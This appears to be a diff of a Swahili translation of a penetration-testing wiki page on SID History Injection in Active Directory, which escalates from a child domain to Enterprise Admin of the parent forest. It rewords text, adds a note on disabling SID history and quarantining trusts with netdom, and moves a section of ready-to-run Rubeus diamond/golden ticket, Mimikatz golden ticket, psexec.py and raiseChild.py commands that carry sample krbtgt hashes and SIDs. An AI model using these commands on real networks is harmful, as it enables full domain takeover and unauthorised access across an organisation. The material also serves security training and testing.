@@ -4,17 +4,45 @@
 
 ## SID History Injection Attack
 
-Lengo la **SID History Injection Attack** ni kusaidia **uhamaji wa watumiaji kati ya maeneo** huku ikihakikisha ufikiaji wa rasilimali kutoka eneo la zamani. Hii inafanywa kwa **kujumuisha Kitambulisho cha Usalama (SID) cha mtumiaji wa zamani katika SID History** ya akaunti yao mpya. Kwa kuzingatia, mchakato huu unaweza kudhibitiwa ili kutoa ufikiaji usioidhinishwa kwa kuongeza SID ya kundi lenye mamlaka makubwa (kama vile Enterprise Admins au Domain Admins) kutoka eneo la mzazi kwenye SID History. Ukatili huu unatoa ufikiaji wa rasilimali zote ndani ya eneo la mzazi.
+Lengo la **SID History Injection Attack** ni kusaidia **uhamaji wa watumiaji kati ya maeneo** huku ikihakikisha upatikanaji wa rasilimali kutoka eneo la zamani. Hii inafanywa kwa **kujumuisha Kitambulisho cha Usalama (SID) cha mtumiaji wa zamani katika SID History** ya akaunti yao mpya. Kwa kuzingatia, mchakato huu unaweza kudhibitiwa ili kutoa upatikanaji usioidhinishwa kwa kuongeza SID ya kundi lenye mamlaka makubwa (kama vile Enterprise Admins au Domain Admins) kutoka eneo la mzazi kwenye SID History. Ukatili huu unatoa upatikanaji wa rasilimali zote ndani ya eneo la mzazi.
 
 Njia mbili zipo za kutekeleza shambulio hili: kupitia uundaji wa **Golden Ticket** au **Diamond Ticket**.
 
-Ili kubaini SID ya kundi la **"Enterprise Admins"**, mtu lazima kwanza apate SID ya eneo la mzazi. Baada ya kutambua, SID ya kundi la Enterprise Admins inaweza kuundwa kwa kuongeza `-519` kwenye SID ya eneo la mzazi. Kwa mfano, ikiwa SID ya eneo la mzazi ni `S-1-5-21-280534878-1496970234-700767426`, SID inayotokana na kundi la "Enterprise Admins" itakuwa `S-1-5-21-280534878-1496970234-700767426-519`.
+Ili kubaini SID ya kundi la **"Enterprise Admins"**, mtu lazima kwanza apate SID ya eneo la mzizi. Baada ya kutambua, SID ya kundi la Enterprise Admins inaweza kujengwa kwa kuongeza `-519` kwenye SID ya eneo la mzizi. Kwa mfano, ikiwa SID ya eneo la mzizi ni `S-1-5-21-280534878-1496970234-700767426`, SID inayotokana na kundi la "Enterprise Admins" itakuwa `S-1-5-21-280534878-1496970234-700767426-519`.
 
-Unaweza pia kutumia vikundi vya **Domain Admins**, ambavyo vinamalizika na **512**.
+Unaweza pia kutumia vikundi vya **Domain Admins**, ambavyo vinamalizika kwa **512**.
 
 Njia nyingine ya kupata SID ya kundi la eneo lingine (kwa mfano "Domain Admins") ni kwa:
-```powershell
+```bash
 Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
+```
+> [!WARNING]
+> Kumbuka kwamba inawezekana kuzima historia ya SID katika uhusiano wa kuaminiana ambayo itafanya shambulio hili kushindwa.
+
+Kulingana na [**docs**](https://technet.microsoft.com/library/cc835085.aspx):
+- **Kuzima SIDHistory kwenye uhusiano wa msitu** kwa kutumia zana ya netdom (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
+- **Kuweka Kizuizi cha SID kwa uhusiano wa nje** kwa kutumia zana ya netdom (`netdom trust /domain: /quarantine:yes on the domain controller`)
+- **Kuweka Kichujio cha SID kwa uhusiano wa kikoa ndani ya msitu mmoja** hakupendekezwi kwani ni usanidi usio na msaada na unaweza kusababisha mabadiliko mabaya. Ikiwa kikoa ndani ya msitu si cha kuaminika basi hakipaswi kuwa mwanachama wa msitu. Katika hali hii ni muhimu kwanza kugawanya kikoa kinachoweza kuaminika na kisichoweza kuaminika katika misitu tofauti ambapo Kichujio cha SID kinaweza kutumika kwa uhusiano wa interforest.
+
+Angalia chapisho hili kwa maelezo zaidi kuhusu kupita hili: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
+
+### Tiketi ya Diamond (Rubeus + KRBTGT-AES256)
+
+Mara ya mwisho nilipojaribu hili nilihitaji kuongeza arg **`/ldap`**.
+```bash
+# Use the /sids param
+Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap
+
+# Or a ptt with a golden ticket
+## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
+## The /printcmd option will print the complete command if later you want to generate a token offline
+Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd
+
+#e.g.
+
+execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domain:current.domain.local /sid:S-1-21-19375142345-528315377-138571287 /rc4:12861032628c1c32c012836520fc7123 /sids:S-1-5-21-2318540928-39816350-2043127614-519 /ptt /ldap /nowrap /printcmd
+
+# You can use "Administrator" as username or any other string
 ```
 ### Golden Ticket (Mimikatz) na KRBTGT-AES256
 ```bash
@@ -39,16 +67,7 @@ Kwa maelezo zaidi kuhusu tiketi za dhahabu angalia:
 golden-ticket.md
 {{#endref}}
 
-### Tiketi ya Almasi (Rubeus + KRBTGT-AES256)
-```powershell
-# Use the /sids param
-Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap
 
-# Or a ptt with a golden ticket
-Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt
-
-# You can use "Administrator" as username or any other string
-```
 Kwa maelezo zaidi kuhusu tiketi za almasi angalia:
 
 {{#ref}}
@@ -59,7 +78,7 @@ diamond-ticket.md
 .\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
 ls \\mcorp-dc.moneycorp.local\c$
 ```
-Pandisha kwa DA wa root au admin wa Enterprise kwa kutumia hash ya KRBTGT ya eneo lililoathirika:
+Pandisha hadi DA wa root au admin wa Enterprise kwa kutumia hash ya KRBTGT ya eneo lililoathirika:
 ```bash
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
 
@@ -101,9 +120,9 @@ psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.1
 ```
 #### Automatic using [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
 
-Hii ni skripti ya Impacket ambayo itafanya **kuongeza kiwango kutoka kwa domain ya mtoto hadi domain ya mzazi**. Skripti inahitaji:
+Hii ni skripti ya Impacket ambayo itafanya **kuongeza hadhi kutoka kwa domain ya mtoto hadi domain ya mzazi**. Skripti inahitaji:
 
-- Kituo cha kudhibiti domain kilicholengwa
+- Kituo cha kudhibiti domain ya lengo
 - Akawasilisha kwa mtumiaji wa admin katika domain ya mtoto
 
 Mchakato ni:
